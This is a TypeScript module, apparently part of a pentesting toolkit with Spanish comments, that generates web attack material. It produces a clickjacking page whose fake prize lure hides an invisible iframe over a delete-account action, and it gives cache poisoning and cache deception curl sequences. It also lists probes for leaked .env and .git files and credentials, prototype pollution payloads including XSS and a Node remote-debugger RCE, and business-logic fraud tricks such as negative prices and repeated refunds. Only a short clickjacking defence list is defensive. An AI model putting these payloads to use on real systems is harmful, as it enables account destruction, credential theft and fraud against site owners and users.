/* Clickjacking, Web Cache (poisoning + deception), Information Disclosure,
   Prototype Pollution y Business Logic. Generadores 100% locales. */

/* ─── Clickjacking ─── */

export interface ClickjackConfig {
  targetUrl: string
  width: number
  height: number
  left: number
  top: number
  opacity: number
  scrollX: number
  scrollY: number
  decoyTitle: string
  decoyBody: string
  decoyButton: string
}

export const defaultClickjackConfig = (): ClickjackConfig => ({
  targetUrl: 'https://target.com/settings/delete-account',
  width: 500,
  height: 320,
  left: -180,
  top: -240,
  opacity: 0.0001,
  scrollX: 0,
  scrollY: 200,
  decoyTitle: '¡Has ganado un iPhone!',
  decoyBody: 'Haz clic para reclamar tu premio antes de que termine el día.',
  decoyButton: 'RECLAMAR PREMIO',
})

export const clickjackHtml = (c: ClickjackConfig): string => {
  const html = [
    '<!DOCTYPE html>',
    '<html lang="es">',
    '<head>',
    '  <meta charset="utf-8">',
    '  <title>' + c.decoyTitle + '</title>',
    '  <style>',
    '    body { margin: 0; font-family: system-ui, sans-serif; background: #f5f5f5; display: flex; align-items: center; justify-content: center; min-height: 100vh; }',
    '    .decoy { position: relative; width: 480px; padding: 40px; background: white; border-radius: 16px; box-shadow: 0 10px 40px rgba(0,0,0,.15); text-align: center; }',
    '    .decoy h1 { margin: 0 0 12px; }',
    '    .decoy button { padding: 14px 34px; font-size: 18px; border: 0; border-radius: 10px; background: #e11d48; color: white; cursor: pointer; }',
    '    /* iframe invisible alineado para que el botón del TARGET caiga bajo el cursor */',
    '    iframe {',
    '      position: absolute;',
    '      width: ' + c.width + 'px;',
    '      height: ' + c.height + 'px;',
    '      left: ' + c.left + 'px;',
    '      top: ' + c.top + 'px;',
    '      opacity: ' + c.opacity + ';',
    '      z-index: 9;',
    '      border: 0;',
    '    }',
    '  </style>',
    '</head>',
    '<body>',
    '  <div class="decoy">',
    '    <h1>' + c.decoyTitle + '</h1>',
    '    <p>' + c.decoyBody + '</p>',
    '    <button>' + c.decoyButton + '</button>',
    '    <iframe src="' + c.targetUrl + '" scrolling="no" tabindex="-1"',
    '      style="left:' + c.left + 'px;top:' + c.top + 'px"></iframe>',
    '  </div>',
    '</body>',
    '</html>',
  ]
  return html.join('\n')
}

/* Variante drag&drop y multi-click para acciones en 2 pasos */
export const clickjackVariants = (): { name: string; idea: string }[] => [
  { name: 'Clásico de 1 click', idea: 'El botón del target cae bajo el cursor de la señuelo. Ideal para "Like", confirmar o aceptar.' },
  { name: 'Clickjacking de 2 clicks', idea: 'Primera página alinea el input, segunda el botón confirmar: roba confirmaciones dobles (borrar cuenta, transferir).' },
  { name: 'Drag & drop', idea: 'El usuario "arrastra" un elemento del señuelo, pero suelta sobre el target (para acciones tipo mover/cargar).' },
  { name: 'Cursor hijacking (cursor:none)', idea: 'El señuelo oculta el cursor real y dibuja otro falso: incluso acciones con feedback visual parecen legítimas.' },
  { name: 'Pestaña invisible (blur+visibility)', idea: 'Abre el target en pestaña oculta con window.open y la sitúa bajo el señuelo: evita X-Frame-Options (no depende de iframe).' },
  { name: 'Text field hijacking', idea: 'Alinea un input invisible del target bajo el del señuelo: el usuario escribe credenciales en el target sin saberlo.' },
]

export const clickjackDefense = (): { check: string; ok: string; fail: string }[] => [
  { check: 'Cabecera CSP frame-ancestors', ok: "CSP: frame-ancestors 'none' o 'self' — la forma moderna, cubre todos los frames", fail: 'Sin CSP: cualquier sitio puede enmarcar la página' },
  { check: 'Cabecera X-Frame-Options', ok: 'X-Frame-Options: DENY o SAMEORIGIN (legacy, solo 1 nivel)', fail: 'Solo SAMEORIGIN permite subframes del mismo origen: aún explotable con nested frames' },
  { check: 'Confirmación de acciones críticas', ok: 'Re-confirmación con input de texto (escribe "BORRAR") o re-auth', fail: 'Un solo click confirma acciones destructivas' },
  { check: 'SameSite en cookies de sesión', ok: 'SameSite=Lax/Strict evita estados cross-site pero NO el click en same-site', fail: 'None sin protección' },
]

/* ─── Web Cache Poisoning ─── */

export interface CacheTech {
  id: string
  name: string
  how: string
  probe: string
  detect: string
}

export const CACHE_TECHS: CacheTech[] = [
  {
    id: 'unkeyed-header',
    name: 'Header sin clave (unkeyed header)',
    how: 'El cache solo usa la URL para la clave, pero el backend refleja cabeceras como X-Forwarded-Host en la respuesta. Envenenas la respuesta cacheada para TODOS los que pidan esa URL.',
    probe: 'Añade X-Forwarded-Host: TU-SERVIDOR.com y mira si aparece reflejado en la respuesta.',
    detect: 'El header reflejado se sirve a otros usuarios: poisoning confirmado.',
  },
  {
    id: 'fat-get',
    name: 'Fat GET',
    how: 'Algunos servidores aceptan cuerpo en GET y otros no: un GET con body donde el backend lee el body pero el cache no lo usa en la clave genera respuestas divergentes.',
    probe: 'GET con cuerpo "callback=TU-SERVIDOR" y observa si el cuerpo influye en la respuesta cacheada.',
    detect: 'La respuesta cambia según el body sin cambiar la URL: divergencia explotable.',
  },
  {
    id: 'header-hide',
    name: 'Header hiding (diferencia de normalización)',
    how: 'Proxy y backend normalizan distinto: duplicar cabeceras, espacios extra o codificación hace que una capa vea un header y otra no. Sirve para colar parámetros que el cache no ve.',
    probe: 'Duplica X-Forwarded-Host o usa espacios/indentación no estándar.',
    detect: 'Comportamiento distinto en respuesta directa vs cacheada.',
  },
  {
    id: 'cache-vary',
    name: 'Abuso de Vary',
    how: 'Si el cache respeta Vary: User-Agent, cada UA genera su propia entrada: puedes envenenar solo TU UA y weaponizar un exploit con User-Agent específico.',
    probe: 'Cambia el User-Agent y comprueba si el cache genera entradas separadas.',
    detect: 'Cache miss por UA: entrada propia por agente, envenenable de forma dirigida.',
  },
  {
    id: 'dom-xss-via-cache',
    name: 'Poisoning → XSS DOM',
    how: 'La combinación clásica: un header reflejado alimenta una fuente de sink DOM (import de JS, JSONP, config). Envenenas una vez, XSS para todos los visitantes.',
    probe: 'Busca reflejos de headers en scripts cargados: import="", src=, config JSON.',
    detect: 'El script cacheado apunta a TU dominio: XSS persistente en el cache.',
  },
]

export const cachePoisonExample = (target: string, attacker: string): { curl: string; explanation: string } => ({
  curl: [
    `# 1. Prueba del reflejo`,
    `curl -s -H "X-Forwarded-Host: ${attacker || 'TU-SERVIDOR.com'}" "${target || 'https://target.com/'}" | grep -i "${attacker || 'TU-SERVIDOR'}"`,
    ``,
    `# 2. Si se refleja, envenena (el cache guarda la respuesta con TU host)`,
    `curl -s -H "X-Forwarded-Host: ${attacker || 'TU-SERVIDOR.com'}/x.js" "${target || 'https://target.com/'}" > /dev/null`,
    ``,
    `# 3. Verificación desde otro cliente (cache hit)`,
    `curl -s "${target || 'https://target.com/'}" | grep -i "${attacker || 'TU-SERVIDOR'}"`,
  ].join('\n'),
  explanation: 'La petición 2 queda cacheada con la respuesta que apunta a tu servidor. Todo visitante de esa URL (hasta que expire el cache) descarga el JS desde TU dominio: XSS en todos.',
})

/* ─── Web Cache Deception ─── */

export const cacheDeceptionPaths = (): { path: string; why: string }[] => [
  { path: '/account/settings/nonexistent.css', why: 'La extensión .css (o .js/.png) engaña al cache: guarda la respuesta dinámica como si fuera estática, con TU sesión.' },
  { path: '/profile/images/private.css', why: 'Variante con path largo: a veces el cache solo mira la extensión final.' },
  { path: '/api/userinfo;a.css', why: 'En Java/Tomcat el ; se traga como path param: la app ve userinfo, el cache ve .css.' },
  { path: '/account/%0a.css', why: 'Salto de línea url-encoded: algunos caches normalizan distinto que el backend.' },
  { path: '/account?x=1#.css', why: 'El fragment no viaja al servidor: si el cache lo cuenta (raro), deception casi gratis.' },
]

export const cacheDeceptionTest = (target: string): string =>
  [
    `# 1. Abre TU perfil autenticado con una extensión estática falsa`,
    `curl -s -H "Cookie: session=TU_COOKIE" "${target || 'https://target.com/account'}/nonexistent.css" -o r1.txt -w "%{http_code}\\n"`,
    ``,
    `# 2. Sin cookies (otro usuario / incógnito): si devuelve TU perfil, el cache guardó datos autenticados bajo esa URL`,
    `curl -s "${target || 'https://target.com/account'}/nonexistent.css" -o r2.txt -w "%{http_code}\\n"`,
    ``,
    `# 3. Compara`,
    `diff r1.txt r2.txt && echo "VULNERABLE: el cache sirve datos autenticados sin cookies"`,
  ].join('\n')

/* ─── Information Disclosure ─── */

export interface DisclosureVector {
  id: string
  name: string
  where: string
  probe: string
  leak: string
  severity: 'info' | 'media' | 'alta' | 'crítica'
}

export const DISCLOSURE_VECTORS: DisclosureVector[] = [
  { id: 'git', name: '.git expuesto', where: 'https://target.com/.git/HEAD', probe: 'curl -s https://target.com/.git/HEAD', leak: 'ref: refs/heads/main → descarga completa del código con git-dumper', severity: 'crítica' },
  { id: 'env', name: '.env / config', where: '/.env, /config.json, /appsettings.json', probe: 'curl -s https://target.com/.env', leak: 'DB_PASSWORD, AWS_SECRET_ACCESS_KEY, SMTP creds', severity: 'crítica' },
  { id: 'backup', name: 'Backups y editor files', where: '/backup.zip, /dump.sql, /.DS_Store, /index.php~', probe: 'fuzz con wordlist de backups (raft-large-files)', leak: 'Base de datos completa o código fuente con secretos', severity: 'crítica' },
  { id: 'debug', name: 'Páginas de debug', where: '/debug, /actuator, /console, /phpinfo.php', probe: 'Spring Boot Actuator: /actuator/env, /actuator/heapdump', leak: 'Variables de entorno, heap con credenciales, beans internos', severity: 'crítica' },
  { id: 'swagger', name: 'Documentación de API', where: '/swagger, /api-docs, /openapi.json, /graphiql', probe: 'curl -s https://target.com/openapi.json | jq .paths', leak: 'Endpoints internos no enlazados, parámetros de admin', severity: 'alta' },
  { id: 'verboze', name: 'Errores verbosos (stack traces)', where: 'cualquier endpoint con input inválido', probe: 'Manda un array, objeto, null o número enorme donde espera string', leak: 'Versiones, framework, rutas absolutas, queries SQL', severity: 'media' },
  { id: 'headers', name: 'Cabeceras y fingerprints', where: 'respuesta HTTP', probe: 'curl -sI https://target.com | grep -iE "server|x-powered|x-aspnet|via"', leak: 'Versiones exactas → CVEs aplicables', severity: 'info' },
  { id: 'comments', name: 'Comentarios HTML', where: 'fuente de la página', probe: 'curl -s https://target.com | grep -E "<!--|TODO|FIXME|/\\*"', leak: 'Rutas internas, IPs, credenciales de test, endpoints ocultos', severity: 'media' },
  { id: 'jsmaps', name: 'Source maps', where: '/*.js.map, /*.css.map', probe: 'curl -s https://target.com/app.js | tail -1 (//# sourceMappingURL=)', leak: 'Código fuente completo con comentarios y secretos hardcodeados', severity: 'alta' },
  { id: 'cors', name: 'CORS mal configurado', where: 'cabeceras Access-Control-*', probe: 'curl -sI -H "Origin: https://evil.com" https://target.com/api/user | grep -i access-control', leak: 'Refleja Origin arbitrario con credenciales → robo de datos cross-origin', severity: 'alta' },
  { id: 's3', name: 'Buckets y storage público', where: 's3.target.com, target.s3.amazonaws.com', probe: 'aws s3 ls s3://target-bucket --no-sign-request', leak: 'Listado de ficheros: backups, uploads privados, dumps', severity: 'crítica' },
  { id: 'crlf', name: 'Ficheros de políticas', where: '/robots.txt, /sitemap.xml, /.well-known/security.txt', probe: 'curl -s https://target.com/robots.txt', leak: 'Rutas que alguien quiso ocultar (Disallow: /admin)', severity: 'info' },
]

/* ─── Prototype Pollution ─── */

export const PP_SINKS: { name: string; gadget: string; payload: string; why: string }[] = [
  {
    name: 'client-side → XSS via innerHTML sink',
    gadget: 'location.search → merge() → innerHTML',
    payload: '?__proto__[html]=<img src=x onerror=alert(1)>',
    why: 'Si la app copia config de un objeto base y vuelca html a innerHTML, contaminar Object.prototype con html inyecta en TODAS las páginas que usen ese sink.',
  },
  {
    name: 'server-side (Express) → RCE via child_process',
    gadget: 'NODE_OPTIONS en spawn',
    payload: '{"__proto__":{"shell":"node","NODE_OPTIONS":"--inspect-brk=0.0.0.0:1337"}}',
    why: 'Express + child_process.spawn con opciones por defecto heredan el prototype: contamina el shell y NODE_OPTIONS y abres un debugger remoto = RCE.',
  },
  {
    name: 'Bypass de filtro con constructor',
    gadget: 'constructor.prototype en vez de __proto__',
    payload: '{"constructor":{"prototype":{"admin":true}}}',
    why: 'Los filtros que solo bloquean la cadena __proto__ no ven constructor.prototype: mismo efecto, distinta ruta.',
  },
  {
    name: 'Pollution de cabeceras HTTP (server-side)',
    gadget: 'status/message en respuestas',
    payload: '{"__proto__":{"status":510,"body":"polluted"}}',
    why: 'Framework que construye la respuesta desde objetos genéricos: la contaminación cambia TODAS las respuestas del servidor.',
  },
  {
    name: 'PP via query params (qs con allowPrototypes)',
    gadget: 'express qs legacy',
    payload: '?__proto__[admin]=true&__proto__[role]=superuser',
    why: 'qs con opciones laxas parsea __proto__[x] y escribe en el prototype: el merge inseguro hace el resto.',
  },
]

export const ppProbeList = (): { param: string; what: string }[] => [
  { param: '?__proto__[probe]=polluted', what: 'sintaxis qs de Express/PHP-style bracket' },
  { param: '?__proto__.probe=polluted', what: 'sintaxis dot (qs con allowDots)' },
  { param: '?constructor[prototype][probe]=polluted', what: 'bypass de filtro __proto__' },
  { param: '{"__proto__":{"probe":"polluted"}}', what: 'body JSON (merge/extend inseguro)' },
  { param: '{"constructor":{"prototype":{"probe":"polluted"}}}', what: 'body JSON con constructor' },
]

/* ─── Business Logic ─── */

export interface LogicPattern {
  id: string
  name: string
  scenario: string
  attack: string
  test: string
  severity: 'alta' | 'media' | 'crítica'
}

export const LOGIC_PATTERNS: LogicPattern[] = [
  {
    id: 'negative-qty',
    name: 'Cantidades y precios negativos',
    scenario: 'Carrito con validación solo de rango superior',
    attack: 'quantity: -1 o price: -10 rebaja el total; en algunos flujos, manda un reembolso automático.',
    test: 'Cambia quantity=-1 en el PUT del carrito y mira el total. Si acepta, prueba -0 y 1e999.',
    severity: 'crítica',
  },
  {
    id: 'race-condition',
    name: 'Race conditions (límite de uso)',
    scenario: 'Cupón/código de un solo uso',
    attack: '20 peticiones paralelas del mismo canje: alguna pasa antes de que el flag "usado" se escriba.',
    test: 'Turbo Intruder con HTTP/2 single-packet o curl paralelo x20 del mismo código.',
    severity: 'crítica',
  },
  {
    id: 'currency-rounding',
    name: 'Redondeo y monedas',
    scenario: 'Precios en múltiplos de moneda',
    attack: 'Cambia currency a una de 0 decimales (JPY, CLP) o mete 0.001: el redondeo puede dejarte el total en 0.',
    test: 'Currency=JPY y price=0.4 → si el backend redondea hacia abajo, gratis.',
    severity: 'alta',
  },
  {
    id: 'step-skip',
    name: 'Saltar pasos del flujo',
    scenario: 'Checkout en 3 pasos',
    attack: 'Salta directo al paso 3 con los datos del paso 1: si el estado no se valida server-side, compras sin pagar.',
    test: 'Accede al endpoint del paso final con el state del primero: mira qué valida realmente.',
    severity: 'crítica',
  },
  {
    id: 'id-tampering',
    name: 'IDs de negocio manipulables',
    scenario: 'Referencias de pedido/usuario secuenciales',
    attack: 'ORDER-1000 → ORDER-1001: si el estado se devuelve sin validar propiedad, hay IDOR de negocio.',
    test: 'Itera la referencia con TU sesión y busca datos de otros pedidos.',
    severity: 'alta',
  },
  {
    id: 'refund-loop',
    name: 'Reembolsos parciales repetidos',
    scenario: 'Devolución de un importe',
    attack: 'Reembolsa el 50% dos veces: si no se marca como completado, sacas el 100%.',
    test: 'Repite la petición de refund con el mismo id: cuenta cuántas acepta.',
    severity: 'crítica',
  },
  {
    id: 'high-value-low-check',
    name: 'Límites solo en el cliente',
    scenario: 'Límite de transferencia o de apuesta',
    attack: 'El frontend bloquea >5000 pero el API no: manda el valor directo al endpoint.',
    test: 'Repetir la petición con el valor máximo desde curl/Repeater: si pasa, el límite es decorativo.',
    severity: 'alta',
  },
  {
    id: 'signup-enum',
    name: 'Lógica de registro/invitación',
    scenario: 'Códigos de invitación o dominios de empresa',
    attack: 'Cambia company=google.com o role=admin en la propia petición de registro: la confianza en input del cliente es la vulnerability.',
    test: 'Registra con campos extra (role, quota, verified=true): mira qué acepta el backend.',
    severity: 'alta',
  },
]
